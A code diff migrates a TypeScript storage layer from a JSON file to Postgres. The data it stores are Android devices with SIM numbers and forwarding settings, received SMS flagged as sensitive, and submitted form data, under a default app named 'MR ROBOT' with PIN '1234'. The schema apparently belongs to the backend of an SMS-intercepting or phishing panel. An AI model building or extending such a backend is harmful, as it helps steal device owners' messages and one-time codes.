@@ -1,6 +1,8 @@
-import { existsSync, mkdirSync, readFileSync, writeFileSync } from "fs";
-import { dirname, resolve } from "path";
-import { randomUUID } from "crypto";
+import { and, asc, desc, eq, sql } from "drizzle-orm";
+import { db, pool, DEFAULT_APP_ID, DEFAULT_APP_NAME, DEFAULT_APP_PIN } from "./db";
+import { apps, devices, messages, formData } from "./schema";
+
+export { DEFAULT_APP_ID, DEFAULT_APP_NAME, DEFAULT_APP_PIN };
 
 export type AppRow = {
   id: number;
@@ -51,202 +53,246 @@ export type FormDataRow = {
   submittedAt: string;
 };
 
-type DataFile = {
-  apps: AppRow[];
-  devices: DeviceRow[];
-  messages: MessageRow[];
-  formData: FormDataRow[];
-  meta: { nextAppId: number; nextDeviceId: number; nextMessageId: number; nextFormDataId: number };
-};
+function iso(d: Date | string | null): string | null {
+  if (d == null) return null;
+  return typeof d === "string" ? d : d.toISOString();
+}
+function isoReq(d: Date | string): string {
+  return typeof d === "string" ? d : d.toISOString();
+}
 
-export const DEFAULT_APP_ID = "SKY-APP-2026-X9F3";
-export const DEFAULT_APP_NAME = "MR ROBOT";
-export const DEFAULT_APP_PIN = "1234";
-
-function makeDefaultApp(): AppRow {
+function mapApp(r: typeof apps.$inferSelect): AppRow {
+  return { id: r.id, appId: r.appId, name: r.name, pin: r.pin, status: r.status, createdAt: isoReq(r.createdAt) };
+}
+function mapDevice(r: typeof devices.$inferSelect): DeviceRow {
   return {
-    id: 1,
-    appId: DEFAULT_APP_ID,
-    name: DEFAULT_APP_NAME,
-    pin: DEFAULT_APP_PIN,
-    status: "active",
-    createdAt: new Date().toISOString(),
+    id: r.id, deviceId: r.deviceId, appId: r.appId, userId: r.userId, name: r.name,
+    androidVersion: r.androidVersion,
+    sim1Carrier: r.sim1Carrier, sim1Phone: r.sim1Phone,
+    sim2Carrier: r.sim2Carrier, sim2Phone: r.sim2Phone,
+    status: r.status, lastOnline: iso(r.lastOnline),
+    forwardEnabled: r.forwardEnabled, forwardSlot: r.forwardSlot,
+    fcmToken: r.fcmToken,
+    installedAt: isoReq(r.installedAt), updatedAt: isoReq(r.updatedAt),
+  };
+}
+function mapMessage(r: typeof messages.$inferSelect): MessageRow {
+  return {
+    id: r.id, appId: r.appId, deviceId: r.deviceId, userId: r.userId,
+    fromSender: r.fromSender, fromNumber: r.fromNumber, body: r.body,
+    isSensitive: r.isSensitive, receivedAt: isoReq(r.receivedAt),
+  };
+}
+function mapFormData(r: typeof formData.$inferSelect): FormDataRow {
+  return {
+    id: r.id, appId: r.appId, deviceId: r.deviceId,
+    data: r.data as Record<string, unknown>,
+    submittedAt: isoReq(r.submittedAt),
   };
 }
 
-const DEFAULT_APP: AppRow = makeDefaultApp();
+export const localDb = {
+  // ------ APPS ------
+  async listApps(): Promise<AppRow[]> {
+    const rows = await db.select().from(apps).orderBy(asc(apps.createdAt));
+    return rows.map(mapApp);
+  },
+  async getApp(appId: string): Promise<AppRow | undefined> {
+    const rows = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
+    return rows[0] ? mapApp(rows[0]) : undefined;
+  },
+  async createApp(input: { appId: string; name: string; pin?: string; status?: string }): Promise<AppRow> {
+    // Atomic insert — let unique constraint surface the conflict, no check-then-insert race
+    const inserted = await db.insert(apps).values({
+      appId: input.appId,
+      name: input.name,
+      pin: input.pin ?? "1234",
+      status: input.status ?? "active",
+    }).onConflictDoNothing({ target: apps.appId }).returning();
+    if (inserted.length === 0) throw new Error("APP_EXISTS");
+    return mapApp(inserted[0]);
+  },
+  async updateApp(appId: string, updates: Partial<Pick<AppRow, "name" | "pin" | "status">>): Promise<AppRow | undefined> {
+    const patch: Partial<typeof apps.$inferInsert> = {};
+    if (updates.name !== undefined) patch.name = updates.name;
+    if (updates.pin !== undefined) patch.pin = updates.pin;
+    if (updates.status !== undefined) patch.status = updates.status;
+    if (Object.keys(patch).length === 0) return this.getApp(appId);
+    const [row] = await db.update(apps).set(patch).where(eq(apps.appId, appId)).returning();
+    return row ? mapApp(row) : undefined;
+  },
+  async deleteApp(appId: string): Promise<AppRow | undefined> {
+    const [row] = await db.delete(apps).where(eq(apps.appId, appId)).returning();
+    return row ? mapApp(row) : undefined;
+  },
 
-function dbFilePath(): string {
-  return resolve(process.env.LOCAL_DB_FILE ?? resolve(process.cwd(), "data", "local-db.json"));
-}
+  // ------ DEVICES ------
+  async listDevices(filter: { appId?: string; userId?: string } = {}): Promise<DeviceRow[]> {
+    const where = filter.appId
+      ? eq(devices.appId, filter.appId)
+      : filter.userId
+        ? eq(devices.userId, filter.userId)
+        : undefined;
+    const q = where ? db.select().from(devices).where(where) : db.select().from(devices);
+    const rows = await q;
+    return rows.map(mapDevice);
+  },
+  async getDevice(deviceId: string): Promise<DeviceRow | undefined> {
+    const rows = await db.select().from(devices).where(eq(devices.deviceId, deviceId)).limit(1);
+    return rows[0] ? mapDevice(rows[0]) : undefined;
+  },
+  async upsertDevice(input: Omit<DeviceRow, "id" | "installedAt" | "updatedAt">): Promise<{ row: DeviceRow; created: boolean }> {
+    // Atomic INSERT ... ON CONFLICT DO UPDATE — single round-trip, race-safe.
+    // `xmax = 0` is true on a fresh insert and non-zero on update, letting us
+    // detect whether the row was created without an extra query.
+    const lastOnlineVal = input.lastOnline ? new Date(input.lastOnline) : null;
+    const { rows } = await pool.query<{
+      id: number; device_id: string; app_id: string; user_id: string; name: string;
+      android_version: number; sim1_carrier: string | null; sim1_phone: string | null;
+      sim2_carrier: string | null; sim2_phone: string | null; status: string;
+      last_online: Date | null; forward_enabled: boolean; forward_slot: number | null;
+      fcm_token: string | null; installed_at: Date; updated_at: Date; was_created: boolean;
+    }>(
+      `INSERT INTO devices (device_id, app_id, user_id, name, android_version, sim1_carrier, sim1_phone, sim2_carrier, sim2_phone, status, last_online, forward_enabled, forward_slot, fcm_token)
+       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14)
+       ON CONFLICT (device_id) DO UPDATE SET
+         app_id = EXCLUDED.app_id,
+         user_id = EXCLUDED.user_id,
+         name = EXCLUDED.name,
+         android_version = EXCLUDED.android_version,
+         sim1_carrier = EXCLUDED.sim1_carrier,
+         sim1_phone = EXCLUDED.sim1_phone,
+         sim2_carrier = EXCLUDED.sim2_carrier,
+         sim2_phone = EXCLUDED.sim2_phone,
+         status = EXCLUDED.status,
+         last_online = EXCLUDED.last_online,
+         forward_enabled = EXCLUDED.forward_enabled,
+         forward_slot = EXCLUDED.forward_slot,
+         fcm_token = EXCLUDED.fcm_token,
+         updated_at = NOW()
+       RETURNING *, (xmax = 0) AS was_created`,
+      [
+        input.deviceId, input.appId, input.userId, input.name, input.androidVersion,
+        input.sim1Carrier, input.sim1Phone, input.sim2Carrier, input.sim2Phone,
+        input.status, lastOnlineVal, input.forwardEnabled, input.forwardSlot, input.fcmToken,
+      ],
+    );
+    const r = rows[0];
+    const mapped: DeviceRow = {
+      id: r.id, deviceId: r.device_id, appId: r.app_id, userId: r.user_id, name: r.name,
+      androidVersion: r.android_version,
+      sim1Carrier: r.sim1_carrier, sim1Phone: r.sim1_phone,
+      sim2Carrier: r.sim2_carrier, sim2Phone: r.sim2_phone,
+      status: r.status, lastOnline: iso(r.last_online),
+      forwardEnabled: r.forward_enabled, forwardSlot: r.forward_slot,
+      fcmToken: r.fcm_token,
+      installedAt: isoReq(r.installed_at), updatedAt: isoReq(r.updated_at),
+    };
+    return { row: mapped, created: r.was_created };
+  },
+  async updateDevice(deviceId: string, updates: Partial<DeviceRow>): Promise<DeviceRow | undefined> {
+    const patch: Partial<typeof devices.$inferInsert> = { updatedAt: new Date() };
+    if (updates.appId !== undefined) patch.appId = updates.appId;
+    if (updates.userId !== undefined) patch.userId = updates.userId;
+    if (updates.name !== undefined) patch.name = updates.name;
+    if (updates.androidVersion !== undefined) patch.androidVersion = updates.androidVersion;
+    if (updates.sim1Carrier !== undefined) patch.sim1Carrier = updates.sim1Carrier;
+    if (updates.sim1Phone !== undefined) patch.sim1Phone = updates.sim1Phone;
+    if (updates.sim2Carrier !== undefined) patch.sim2Carrier = updates.sim2Carrier;
+    if (updates.sim2Phone !== undefined) patch.sim2Phone = updates.sim2Phone;
+    if (updates.status !== undefined) patch.status = updates.status;
+    if (updates.lastOnline !== undefined) patch.lastOnline = updates.lastOnline ? new Date(updates.lastOnline) : null;
+    if (updates.forwardEnabled !== undefined) patch.forwardEnabled = updates.forwardEnabled;
+    if (updates.forwardSlot !== undefined) patch.forwardSlot = updates.forwardSlot;
+    if (updates.fcmToken !== undefined) patch.fcmToken = updates.fcmToken;
+    const [row] = await db.update(devices).set(patch).where(eq(devices.deviceId, deviceId)).returning();
+    return row ? mapDevice(row) : undefined;
+  },
 
-function emptyData(): DataFile {
-  return {
-    apps: [makeDefaultApp()],
-    devices: [],
-    messages: [],
-    formData: [],
-    meta: { nextAppId: 2, nextDeviceId: 1, nextMessageId: 1, nextFormDataId: 1 },
-  };
-}
+  // ------ MESSAGES ------
+  async listMessages(filter: { appId?: string; userId?: string; deviceId?: string } = {}): Promise<MessageRow[]> {
+    const where = filter.appId
+      ? eq(messages.appId, filter.appId)
+      : filter.userId
+        ? eq(messages.userId, filter.userId)
+        : filter.deviceId
+          ? eq(messages.deviceId, filter.deviceId)
+          : undefined;
+    const q = where
+      ? db.select().from(messages).where(where).orderBy(desc(messages.receivedAt))
+      : db.select().from(messages).orderBy(desc(messages.receivedAt));
+    const rows = await q;
+    return rows.map(mapMessage);
+  },
+  async createMessage(input: Omit<MessageRow, "id" | "receivedAt"> & { receivedAt?: string }): Promise<MessageRow> {
+    const [row] = await db.insert(messages).values({
+      appId: input.appId,
+      deviceId: input.deviceId,
+      userId: input.userId,
+      fromSender: input.fromSender,
+      fromNumber: input.fromNumber,
+      body: input.body,
+      isSensitive: input.isSensitive,
+      receivedAt: input.receivedAt ? new Date(input.receivedAt) : new Date(),
+    }).returning();
+    return mapMessage(row);
+  },
 
-class LocalDb {
-  private data: DataFile;
-  private readonly file: string;
+  // ------ FORM DATA ------
+  async listFormData(filter: { appId: string; deviceId?: string }): Promise<FormDataRow[]> {
+    const where = filter.deviceId
+      ? and(eq(formData.appId, filter.appId), eq(formData.deviceId, filter.deviceId))
+      : eq(formData.appId, filter.appId);
+    const rows = await db.select().from(formData).where(where).orderBy(desc(formData.submittedAt));
+    return rows.map(mapFormData);
+  },
+  async createFormData(input: Omit<FormDataRow, "id" | "submittedAt">): Promise<FormDataRow> {
+    const [row] = await db.insert(formData).values({
+      appId: input.appId,
+      deviceId: input.deviceId,
+      data: input.data,
+    }).returning();
+    return mapFormData(row);
+  },
+  async deleteFormData(id: number): Promise<FormDataRow | undefined> {
+    const [row] = await db.delete(formData).where(eq(formData.id, id)).returning();
+    return row ? mapFormData(row) : undefined;
+  },
 
-  constructor() {
-    this.file = dbFilePath();
-    this.data = this.load();
-  }
-
-  private load(): DataFile {
-    if (!existsSync(this.file)) {
-      const initial = emptyData();
-      this.save(initial);
-      return initial;
+  // ------ STATS / SAMPLE ------
+  async stats(appId?: string): Promise<Record<string, number>> {
+    if (appId) {
+      const [d] = await db.select({ c: sql<string>`count(*)::text` }).from(devices).where(eq(devices.appId, appId));
+      const [m] = await db.select({ c: sql<string>`count(*)::text` }).from(messages).where(eq(messages.appId, appId));
+      const [f] = await db.select({ c: sql<string>`count(*)::text` }).from(formData).where(eq(formData.appId, appId));
+      return { devices: Number(d.c), messages: Number(m.c), formData: Number(f.c) };
     }
-    try {
-      const parsed = JSON.parse(readFileSync(this.file, "utf8")) as Partial<DataFile>;
-      const normalized = this.normalizeData(parsed);
-      this.save(normalized);
-      return normalized;
-    } catch {
-      const backup = `${this.file}.broken-${Date.now()}-${randomUUID()}`;
-      try { writeFileSync(backup, readFileSync(this.file)); } catch {}
-      const initial = emptyData();
-      this.save(initial);
-      return initial;
-    }
-  }
-
-  private normalizeData(parsed: Partial<DataFile>): DataFile {
-    const apps = [...(parsed.apps ?? [])];
-    const defaultIndex = apps.findIndex((a) => a.appId === DEFAULT_APP_ID);
-
-    if (defaultIndex === -1) {
-      apps.unshift(makeDefaultApp());
-    } else {
-      // Keep the demo app visible in Master Admin even if older data had it disabled/renamed.
-      apps[defaultIndex] = {
-        ...apps[defaultIndex],
-        appId: DEFAULT_APP_ID,
-        name: apps[defaultIndex].name || DEFAULT_APP_NAME,
-        pin: apps[defaultIndex].pin || DEFAULT_APP_PIN,
-        status: "active",
-        createdAt: apps[defaultIndex].createdAt || new Date().toISOString(),
+    const [a] = await db.select({ c: sql<string>`count(*)::text` }).from(apps);
+    const [d] = await db.select({ c: sql<string>`count(*)::text` }).from(devices);
+    const [m] = await db.select({ c: sql<string>`count(*)::text` }).from(messages);
+    const [f] = await db.select({ c: sql<string>`count(*)::text` }).from(formData);
+    return { apps: Number(a.c), devices: Number(d.c), messages: Number(m.c), formData: Number(f.c) };
+  },
+  async sample(appId?: string): Promise<Record<string, unknown>> {
+    if (appId) {
+      const [d] = await db.select().from(devices).where(eq(devices.appId, appId)).limit(1);
+      const [m] = await db.select().from(messages).where(eq(messages.appId, appId)).limit(1);
+      const [f] = await db.select().from(formData).where(eq(formData.appId, appId)).limit(1);
+      return {
+        devices: d ? mapDevice(d) : null,
+        messages: m ? mapMessage(m) : null,
+        formData: f ? mapFormData(f) : null,
       };
     }
-
-    const maxAppId = apps.reduce((max, app) => Math.max(max, Number(app.id) || 0), 1);
-
+    const [a] = await db.select().from(apps).limit(1);
+    const [d] = await db.select().from(devices).limit(1);
+    const [m] = await db.select().from(messages).limit(1);
+    const [f] = await db.select().from(formData).limit(1);
     return {
-      apps,
-      devices: parsed.devices ?? [],
-      messages: parsed.messages ?? [],
-      formData: parsed.formData ?? [],
-      meta: {
-        nextAppId: Math.max(parsed.meta?.nextAppId ?? 0, maxAppId + 1),
-        nextDeviceId: parsed.meta?.nextDeviceId ?? ((parsed.devices?.length ?? 0) + 1),
-        nextMessageId: parsed.meta?.nextMessageId ?? ((parsed.messages?.length ?? 0) + 1),
-        nextFormDataId: parsed.meta?.nextFormDataId ?? ((parsed.formData?.length ?? 0) + 1),
-      },
+      apps: a ? mapApp(a) : null,
+      devices: d ? mapDevice(d) : null,
+      messages: m ? mapMessage(m) : null,
+      formData: f ? mapFormData(f) : null,
     };
-  }
-
-  private save(data = this.data): void {
-    mkdirSync(dirname(this.file), { recursive: true });
-    writeFileSync(this.file, JSON.stringify(data, null, 2));
-  }
-
-  listApps(): AppRow[] { return [...this.data.apps].sort((a, b) => a.createdAt.localeCompare(b.createdAt)); }
-  getApp(appId: string): AppRow | undefined { return this.data.apps.find((a) => a.appId === appId); }
-  createApp(input: { appId: string; name: string; pin?: string; status?: string }): AppRow {
-    if (this.getApp(input.appId)) throw new Error("APP_EXISTS");
-    const row: AppRow = { id: this.data.meta.nextAppId++, appId: input.appId, name: input.name, pin: input.pin ?? "1234", status: input.status ?? "active", createdAt: new Date().toISOString() };
-    this.data.apps.push(row); this.save(); return row;
-  }
-  updateApp(appId: string, updates: Partial<Pick<AppRow, "name" | "pin" | "status">>): AppRow | undefined {
-    const app = this.getApp(appId); if (!app) return undefined;
-    if (updates.name !== undefined) app.name = updates.name;
-    if (updates.pin !== undefined) app.pin = updates.pin;
-    if (updates.status !== undefined) app.status = updates.status;
-    this.save(); return app;
-  }
-  deleteApp(appId: string): AppRow | undefined {
-    const idx = this.data.apps.findIndex((a) => a.appId === appId); if (idx < 0) return undefined;
-    const [row] = this.data.apps.splice(idx, 1); this.save(); return row;
-  }
-
-  listDevices(filter: { appId?: string; userId?: string } = {}): DeviceRow[] {
-    return this.data.devices.filter((d) => filter.appId ? d.appId === filter.appId : filter.userId ? d.userId === filter.userId : true);
-  }
-  getDevice(deviceId: string): DeviceRow | undefined { return this.data.devices.find((d) => d.deviceId === deviceId); }
-  upsertDevice(input: Omit<DeviceRow, "id" | "installedAt" | "updatedAt">): { row: DeviceRow; created: boolean } {
-    const now = new Date().toISOString();
-    const existing = this.getDevice(input.deviceId);
-    if (existing) {
-      Object.assign(existing, input, { updatedAt: now });
-      this.save(); return { row: existing, created: false };
-    }
-    const row: DeviceRow = { ...input, id: this.data.meta.nextDeviceId++, installedAt: now, updatedAt: now };
-    this.data.devices.push(row); this.save(); return { row, created: true };
-  }
-  updateDevice(deviceId: string, updates: Partial<DeviceRow>): DeviceRow | undefined {
-    const row = this.getDevice(deviceId); if (!row) return undefined;
-    Object.assign(row, updates, { updatedAt: new Date().toISOString() });
-    this.save(); return row;
-  }
-
-  listMessages(filter: { appId?: string; userId?: string; deviceId?: string } = {}): MessageRow[] {
-    return this.data.messages
-      .filter((m) => filter.appId ? m.appId === filter.appId : filter.userId ? m.userId === filter.userId : filter.deviceId ? m.deviceId === filter.deviceId : true)
-      .sort((a, b) => b.receivedAt.localeCompare(a.receivedAt));
-  }
-  createMessage(input: Omit<MessageRow, "id" | "receivedAt"> & { receivedAt?: string }): MessageRow {
-    const row: MessageRow = { ...input, id: this.data.meta.nextMessageId++, receivedAt: input.receivedAt ?? new Date().toISOString() };
-    this.data.messages.push(row); this.save(); return row;
-  }
-
-  listFormData(filter: { appId: string; deviceId?: string }): FormDataRow[] {
-    return this.data.formData
-      .filter((f) => f.appId === filter.appId && (!filter.deviceId || f.deviceId === filter.deviceId))
-      .sort((a, b) => b.submittedAt.localeCompare(a.submittedAt));
-  }
-  createFormData(input: Omit<FormDataRow, "id" | "submittedAt">): FormDataRow {
-    const row: FormDataRow = { ...input, id: this.data.meta.nextFormDataId++, submittedAt: new Date().toISOString() };
-    this.data.formData.push(row); this.save(); return row;
-  }
-  deleteFormData(id: number): FormDataRow | undefined {
-    const idx = this.data.formData.findIndex((f) => f.id === id); if (idx < 0) return undefined;
-    const [row] = this.data.formData.splice(idx, 1); this.save(); return row;
-  }
-
-  stats(appId?: string): Record<string, number> {
-    return appId ? {
-      devices: this.data.devices.filter((d) => d.appId === appId).length,
-      messages: this.data.messages.filter((m) => m.appId === appId).length,
-      formData: this.data.formData.filter((f) => f.appId === appId).length,
-    } : {
-      apps: this.data.apps.length,
-      devices: this.data.devices.length,
-      messages: this.data.messages.length,
-      formData: this.data.formData.length,
-    };
-  }
-
-  sample(appId?: string): Record<string, unknown> {
-    if (appId) return {
-      devices: this.data.devices.find((d) => d.appId === appId) ?? null,
-      messages: this.data.messages.find((m) => m.appId === appId) ?? null,
-      formData: this.data.formData.find((f) => f.appId === appId) ?? null,
-    };
-    return {
-      apps: this.data.apps[0] ?? null,
-      devices: this.data.devices[0] ?? null,
-      messages: this.data.messages[0] ?? null,
-      formData: this.data.formData[0] ?? null,
-    };
-  }
-}
-
-export const localDb = new LocalDb();
+  },
+};
